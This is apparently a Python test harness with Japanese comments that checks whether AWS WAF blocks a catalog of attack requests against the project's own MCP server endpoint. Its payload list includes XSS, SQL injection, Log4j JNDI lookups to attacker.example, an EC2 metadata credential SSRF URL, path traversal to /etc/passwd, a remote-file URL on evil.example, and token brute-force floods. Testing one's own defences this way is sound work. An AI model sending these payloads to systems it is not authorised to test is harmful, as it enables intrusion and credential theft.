"""WAF攻撃パターンテストハーネス(pattern4: ECS + API Gateway 向け)。

docs/19-internal-weekly-verification-plan-week5.md §1.4 の攻撃パターンカタログ(A01〜A25)をデータ駆動で
実行し、各リクエストが WAF で遮断されたか(403)、サーバーに到達したか(200/400等)を記録する。
各リクエストには `X-Waf-Test-Id: <run-id>-<A##>` を付与し、WAFログ(httpRequest.headers)と
突合できるようにする。docs/20-internal-production-readiness-checklist.md の WAF-1x 行の証跡になる。

使い方:
  eval "$(python3 scripts/pattern4_token.py bootstrap)"     # トークン取得(初回)
  python3 scripts/waf_attack_tests.py --expect nowaf --report docs/evidence/$(date +%F)-waf-baseline.json
  python3 scripts/waf_attack_tests.py --expect waf   --base https://<cloudfront-domain> --report ...
  python3 scripts/waf_attack_tests.py --pattern A02 --pattern A25          # 一部のみ
  python3 scripts/waf_attack_tests.py --include-rate --rate-count 60       # レート系(A16〜A18)も実行

  --expect nowaf: WAF無し(または Count モード)の基準線。全リクエストがサーバーへ到達し、
                  サーバー側の応答コード(200/400/404/405/413)を記録する
  --expect waf:   Block モード。攻撃パターンは 403、正常系コーパス(A25)は 200 を期待する

対象URL(--base)は API Gateway 直・CloudFront 経由・REST API スパイクのいずれも指定できる。
"""
import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request
import uuid

DEFAULT_BASE = "https://2a5r57wfoa.execute-api.ap-northeast-1.amazonaws.com"
CREATED_PATH = os.path.join(os.environ.get("TMPDIR", "/tmp"), "dcr_conformance_created_clients.json")  # dcr_conformance_tests.py --cleanup と共有
JSON_HEADERS = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}


def http(url, method, headers, data, timeout=30):
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace"), {k.lower(): v for k, v in resp.headers.items()}, time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), {k.lower(): v for k, v in e.headers.items()}, time.time() - t0
    except Exception as e:  # noqa: BLE001
        return None, str(e), {}, time.time() - t0


def rpc(method, params, rid=1):
    return json.dumps({"jsonrpc": "2.0", "id": rid, "method": method, "params": params}, ensure_ascii=False).encode()


def tool_call(name, arguments):
    return rpc("tools/call", {"name": name, "arguments": arguments})


def kw(payload):
    """search_stocks の自由文字列引数 KW にペイロードを埋め込む(最も一般的なボディ注入点)。"""
    return tool_call("search_stocks", {"KW": [payload]})


# ---------------------------------------------------------------- pattern catalog
# 各パターン: id, category, build(ctx) -> dict(method, path, headers, body), expect_waf, expect_nowaf, note
# expect_* は許容するHTTPステータスの集合。None は「記録のみ(INFO)」。

def P(pid, category, build, expect_waf, expect_nowaf, note="", rate=False):
    return {"id": pid, "category": category, "build": build, "expect_waf": expect_waf, "expect_nowaf": expect_nowaf, "note": note, "rate": rate}


def body_pattern(pid, category, payload, note="", tool=None):
    return P(pid, category, lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": (tool or kw)(payload)}, {403}, {200}, note)


PATTERNS = [
    body_pattern("A01", "XSS (body)", "<script>alert(1)</script>", "CommonRuleSet CrossSiteScripting_BODY"),
    body_pattern("A02", "SQLi (body)", "' OR '1'='1' UNION SELECT username, password FROM users --", "SQLiRuleSet SQLi_BODY"),
    body_pattern("A03a", "Log4j/JNDI (body)", "${jndi:ldap://attacker.example/a}", "KnownBadInputs Log4JRCE_BODY"),
    P("A03b", "Log4j/JNDI (header)", lambda c: {"method": "POST", "path": "/mcp", "headers": {"User-Agent": "${jndi:ldap://attacker.example/a}"}, "body": kw("7203")}, {403}, {200}, "KnownBadInputs Log4JRCE_HEADER"),
    P("A03c", "Log4j/JNDI (query)", lambda c: {"method": "POST", "path": "/mcp?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D", "headers": {}, "body": kw("7203")}, {403}, {200}, "KnownBadInputs Log4JRCE_QUERYSTRING"),
    P("A04", "Java deserialization (body)", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": kw("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvckk")}, None, {200}, "KnownBadInputs JavaDeserializationRCE_BODY。**2026-09-14 実測: JSON 文字列値に埋めた Base64 の Java シリアライズ列は Block されない**(Count もされない)。JSON ボディ内の Base64 ペイロードは検知対象外とみなし、必要ならカスタムルールを検討する"),
    P("A05a", "Path traversal (URI)", lambda c: {"method": "POST", "path": "/mcp/../../etc/passwd", "headers": {}, "body": kw("7203")}, {400, 403}, {400, 401, 403, 404, 405}, "CommonRuleSet GenericLFI_URIPATH。CloudFront経由では WAF 評価前に CloudFront 自身が 400 で拒否する(2026-09-14 実測)"),
    P("A05b", "Path traversal encoded (URI)", lambda c: {"method": "POST", "path": "/mcp/..%2f..%2fetc%2fpasswd", "headers": {}, "body": kw("7203")}, {400, 403}, {400, 401, 403, 404, 405}, "CommonRuleSet GenericLFI_URIPATH。同上"),
    body_pattern("A06", "LFI (body)", "../../../../etc/passwd", "CommonRuleSet GenericLFI_BODY"),
    body_pattern("A07", "SSRF EC2 metadata (body)", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "CommonRuleSet EC2MetaDataSSRF_BODY"),
    P("A08", "RFI external URL (body)", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": kw("http://evil.example/shell.txt?")}, None, {200}, "CommonRuleSet GenericRFI_BODY。正当な引数にURLが入りうるため意図的に count 上書き(cloudfront_waf.tf の common_rule_set_count_overrides)。ラベル付与のみを WAF ログで確認する"),
    P("A09", "Host: localhost", lambda c: {"method": "POST", "path": "/mcp", "headers": {"Host": "localhost"}, "body": kw("7203")}, {403}, {400, 403, 404, 421}, "KnownBadInputs Host_localhost_HEADER"),
    P("A10a", "PROPFIND method", lambda c: {"method": "PROPFIND", "path": "/mcp", "headers": {}, "body": None}, {403}, {400, 401, 403, 404, 405, 501}, "KnownBadInputs PROPFIND_METHOD"),
    P("A10b", "TRACE method", lambda c: {"method": "TRACE", "path": "/mcp", "headers": {}, "body": None}, {403, 405}, {400, 401, 403, 404, 405, 501}, "カスタム許可メソッド外Block。CloudFront は TRACE を自身で 405 拒否する(2026-09-14 実測)"),
    P("A11a", "No User-Agent", lambda c: {"method": "POST", "path": "/mcp", "headers": {"User-Agent": ""}, "body": kw("7203")}, None, {200}, "CommonRuleSet NoUserAgent_HEADER(Count運用、MCPクライアントの実UAを要確認)"),
    P("A11b", "Bad bot UA", lambda c: {"method": "POST", "path": "/mcp", "headers": {"User-Agent": "Nikto/2.1.6"}, "body": kw("7203")}, {403}, {200}, "CommonRuleSet UserAgent_BadBots_HEADER"),
    P("A12", "Oversized body 12KB", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": kw("A" * 12 * 1024)}, None, {200}, "CommonRuleSet SizeRestrictions_BODY(8KB超)は長文引数で誤検知するため意図的に count 上書き。遮断はカスタム 64KB 超ルールが担う(A13)"),
    body_pattern("A13a", "Oversized body 70KB", "B" * 70 * 1024, "カスタム size_constraint 64KB超 / oversize_handling"),
    P("A13b", "Oversized body 200KB", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": kw("C" * 200 * 1024)}, {403, 413}, {413}, "サーバー express.json 100KB上限 → 413。WAF側は oversize_handling の設定次第"),
    P("A14", "Malformed JSON", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": b'{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{'}, None, {400}, "WAF json_body invalid_fallback_behavior が MATCH にならないこと"),
    P("A15", "JSON-RPC batch x50", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": json.dumps([{"jsonrpc": "2.0", "id": i, "method": "ping", "params": {}} for i in range(50)]).encode()}, {403}, None, "基準線(2026-09-13)で v1 SDK サーバーは50件を200で全処理した(増幅攻撃の入口)。WAFカスタムルール(ボディ先頭 '[' をBlock)候補"),
    P("A19", "Geo (self IP)", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": kw("7203")}, None, {200}, "geo_match は Count 運用。自IPの国コードをWAFログで確認"),
    P("A22a", "Content-Type text/plain", lambda c: {"method": "POST", "path": "/mcp", "headers": {"Content-Type": "text/plain"}, "body": kw("7203")}, {403, 415}, {400, 406, 415}, "WAF のカスタムルールは未実装。MCP サーバー(v1 SDK)が 415 を返すことで防御されている。WAF 層で弾くかは運用判断"),
    P("A22b", "Missing Accept", lambda c: {"method": "POST", "path": "/mcp", "headers": {"Accept": "*/*"}, "body": kw("7203")}, None, {200, 400, 406}, "MCPクライアントの実送信値を要確認"),
    P("A22c", "Oversized header 9KB", lambda c: {"method": "POST", "path": "/mcp", "headers": {"X-Padding": "P" * 9 * 1024}, "body": kw("7203")}, None, {200, 400, 431, 494}, "ヘッダサイズ上限の挙動"),
    P("A23a", "Unknown MCP-Protocol-Version", lambda c: {"method": "POST", "path": "/mcp", "headers": {"MCP-Protocol-Version": "9999-99-99"}, "body": kw("7203")}, None, {200, 400}, "サーバー側の版数検証を記録"),
    P("A23b", "Forged Mcp-Session-Id", lambda c: {"method": "POST", "path": "/mcp", "headers": {"Mcp-Session-Id": "00000000-0000-4000-8000-000000000000"}, "body": kw("7203")}, None, {200, 400, 404}, "ステートレスサーバーでの扱いを記録"),
    P("A24", "x-cognito-sub spoof", lambda c: {"method": "POST", "path": "/mcp", "headers": {"x-cognito-sub": "00000000-spoofed-sub-000000000000"}, "body": rpc("tools/list", {})}, {200}, {200}, "200 でもサーバーが見る sub は Authorizer 由来であること(ECSログで確認、S4)"),
    # 未認証・別ルートへの攻撃(全ルート保護の確認: WAF-01)
    P("A02r", "SQLi to /register (unauth route)", lambda c: {"method": "POST", "path": "/register", "headers": {}, "body": json.dumps({"client_name": "' OR '1'='1' UNION SELECT 1,2,3 --", "redirect_uris": ["https://claude.ai/api/mcp/auth_callback"]}).encode(), "noauth": True}, {403}, {201, 400, 429}, "ALBアタッチでは守れない経路。201 の場合は --cleanup 対象"),
    P("A01t", "XSS to /token (unauth route)", lambda c: {"method": "POST", "path": "/token", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": b"grant_type=authorization_code&code=%3Cscript%3Ealert(1)%3C%2Fscript%3E&client_id=x", "noauth": True}, {403}, {400, 401}, "ALBアタッチでは守れない経路"),
    P("A05w", "Traversal to /.well-known", lambda c: {"method": "GET", "path": "/.well-known/../../etc/passwd", "headers": {}, "body": None, "noauth": True}, {400, 403}, {400, 401, 403, 404}, "ALBアタッチでは守れない経路。CloudFront 経由では CloudFront 自身が 400 で拒否"),
    P("A01a", "XSS to /authorize query", lambda c: {"method": "GET", "path": "/authorize?client_id=%3Cscript%3Ealert(1)%3C%2Fscript%3E&response_type=code", "headers": {}, "body": None, "noauth": True, "no_redirect": True}, {403}, {302, 400}, "ALBアタッチでは守れない経路"),
]

# 正常系コーパス(A25): 誤検知判定。すべて 200 を期待する。
BENIGN = [
    ("A25-01", "get_quote 通常", tool_call("get_quote", {"QCs": ["7203/T", "101/T"], "ECs": ["DPP", "DPC"]})),
    ("A25-02", "search_stocks 日本語", kw("トヨタ自動車")),
    ("A25-03", "search_stocks SQL風語句", kw("SELECT from ORDER BY 銘柄 union")),
    ("A25-04", "search_stocks URL含む", kw("https://www.nikkei.com/markets/kabu/ 決算")),
    ("A25-05", "search_stocks 記号多用", kw("A&B <会社> \"引用\" 'アポ' 100% #1 (株)")),
    ("A25-06", "search_stocks 長文4KB", kw("半導体 製造装置 " * 300)),
    ("A25-07", "search_stocks 長文12KB", kw("生成AI 関連銘柄 " * 900)),
    ("A25-08", "search_news 通常", tool_call("search_news", {"VGC": ["1"]})),
    ("A25-09", "get_ranking 通常", tool_call("get_ranking", {"II": "1"})),
    ("A25-10", "get_price_history 通常", tool_call("get_price_history", {"QC": "7203/T", "ECs": ["DPP"]})),
    ("A25-11", "get_intraday_history 通常", tool_call("get_intraday_history", {"QC": "7203/T", "ECs": ["DPP"]})),
    ("A25-12", "tools/list", rpc("tools/list", {})),
    ("A25-13", "initialize", rpc("initialize", {"protocolVersion": "2025-11-25", "capabilities": {}, "clientInfo": {"name": "waf-attack-tests", "version": "1.0"}})),
]
for _pid, _title, _body in BENIGN:
    PATTERNS.append(P(_pid, f"benign: {_title}", (lambda b: lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": b})(_body), {200}, {200}, "誤検知判定(FP)"))

RATE_PATTERNS = [
    P("A16", "Flood /mcp same token", lambda c: {"method": "POST", "path": "/mcp", "headers": {}, "body": rpc("ping", {})}, {403, 429}, {200}, "レートベース(IP / Authorization キー)。専用低閾値ルールで実施", rate=True),
    P("A17", "Flood /register", lambda c: {"method": "POST", "path": "/register", "headers": {}, "body": json.dumps({"redirect_uris": ["https://claude.ai/api/mcp/auth_callback"], "client_name": "waf-flood"}).encode(), "noauth": True}, {403, 429}, {429}, "route throttling(burst5/rate2) + レートベース。201 の分は --cleanup 対象", rate=True),
    P("A18", "Brute force /token", lambda c: {"method": "POST", "path": "/token", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": b"grant_type=client_credentials&client_id=bogus&client_secret=bogus", "noauth": True}, {403, 429}, {400, 401}, "レートベース(scope-down /token) + Cognito WAF", rate=True),
]


# ---------------------------------------------------------------- runner

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **kw):  # noqa: ARG002
        return None


def run_one(base, token, run_id, p, expect, rate_count):
    spec = p["build"](None)
    headers = dict(JSON_HEADERS)
    if not spec.get("noauth"):
        headers["Authorization"] = f"Bearer {token}"
    headers.update(spec["headers"])
    headers = {k: v for k, v in headers.items() if v != "" or k != "User-Agent"}
    headers["X-Waf-Test-Id"] = f"{run_id}-{p['id']}"
    if "User-Agent" in spec["headers"] and spec["headers"]["User-Agent"] == "":
        headers.pop("User-Agent", None)
        headers["X-No-UA"] = "1"  # urllib は UA を自動付与するため、完全削除は curl 側で別途確認する
    url = f"{base}{spec['path']}"

    if spec.get("no_redirect"):
        opener = urllib.request.build_opener(NoRedirect)
        urllib.request.install_opener(opener)
    try:
        if p["rate"]:
            statuses = []
            t0 = time.time()
            for _ in range(rate_count):
                s, _, _, _ = http(url, spec["method"], headers, spec["body"], timeout=15)
                statuses.append(s)
            elapsed = time.time() - t0
            blocked = sum(1 for s in statuses if s in (403, 429))
            detail = f"{rate_count} req in {elapsed:.1f}s: blocked(403/429)={blocked}, statuses={sorted(set(statuses), key=lambda x: (x is None, x))}"
            expected = p["expect_waf"] if expect == "waf" else p["expect_nowaf"]
            if expected is None:
                status = "INFO"
            elif expect == "waf":
                status = "PASS" if blocked > 0 else "FAIL"
            else:
                status = "PASS" if all((s in expected) or s == 429 for s in statuses) else "FAIL"
            return {"id": p["id"], "category": p["category"], "status": status, "http": statuses[-1], "detail": detail, "note": p["note"], "test_header": headers["X-Waf-Test-Id"]}

        s, text, h, elapsed = http(url, spec["method"], headers, spec["body"])
    finally:
        if spec.get("no_redirect"):
            urllib.request.install_opener(urllib.request.build_opener())

    if spec["path"].startswith("/register") and s == 201:
        try:
            cid = json.loads(text).get("client_id")
            existing = json.load(open(CREATED_PATH, encoding="utf-8")) if os.path.exists(CREATED_PATH) else []
            with open(CREATED_PATH, "w", encoding="utf-8") as f:
                json.dump(sorted(set(existing + [cid])), f)
        except (json.JSONDecodeError, TypeError, OSError):
            pass

    expected = p["expect_waf"] if expect == "waf" else p["expect_nowaf"]
    if expected is None:
        status = "INFO"
    else:
        status = "PASS" if s in expected else "FAIL"
    snippet = text.replace("\n", " ")[:140]
    return {
        "id": p["id"], "category": p["category"], "status": status, "http": s, "elapsed_s": round(elapsed, 2),
        "detail": f"HTTP {s} (expected {sorted(expected) if expected else 'record only'}) {snippet}",
        "note": p["note"], "test_header": headers["X-Waf-Test-Id"],
        "waf_headers": {k: v for k, v in h.items() if k.startswith(("x-amzn", "x-cache", "via", "x-amz-cf"))},
    }


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base", default=os.environ.get("MCP_ECS_BASE", DEFAULT_BASE))
    ap.add_argument("--token", default=os.environ.get("MCP_ECS_TOKEN"))
    ap.add_argument("--expect", choices=["waf", "nowaf"], default="nowaf")
    ap.add_argument("--pattern", action="append", help="実行するパターンID接頭辞(例: A02, A25)")
    ap.add_argument("--include-rate", action="store_true", help="A16〜A18 のレート系も実行する")
    ap.add_argument("--rate-count", type=int, default=40)
    ap.add_argument("--run-id", default=time.strftime("%Y%m%d%H%M%S") + "-" + uuid.uuid4().hex[:6])
    ap.add_argument("--report")
    args = ap.parse_args()
    if not args.token:
        sys.exit("トークンが必要です: eval \"$(python3 scripts/pattern4_token.py bootstrap)\" または --token")

    base = args.base.rstrip("/")
    selected = PATTERNS + (RATE_PATTERNS if args.include_rate else [])
    if args.pattern:
        selected = [p for p in selected if any(p["id"].startswith(x) for x in args.pattern)]

    print(f"target={base} expect={args.expect} run_id={args.run_id} patterns={len(selected)}")
    results = []
    for p in selected:
        r = run_one(base, args.token, args.run_id, p, args.expect, args.rate_count)
        results.append(r)
        print(f"  [{r['status']:<4}] {r['id']:<7} {r['category']:<34} {r['detail'][:110]}")

    counts = {}
    for r in results:
        counts[r["status"]] = counts.get(r["status"], 0) + 1
    print(f"\n== サマリ: {counts}")
    print("WAFログとの突合: httpRequest.headers[name='x-waf-test-id'].value が run_id で始まる行を CloudWatch Logs Insights で抽出する")

    if args.report:
        os.makedirs(os.path.dirname(args.report) or ".", exist_ok=True)
        with open(args.report, "w", encoding="utf-8") as f:
            json.dump({"target": base, "expect": args.expect, "run_id": args.run_id, "run_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                       "summary": counts, "results": results}, f, ensure_ascii=False, indent=2)
        print(f"report: {args.report}")
    sys.exit(0 if counts.get("FAIL", 0) == 0 else 1)


if __name__ == "__main__":
    main()
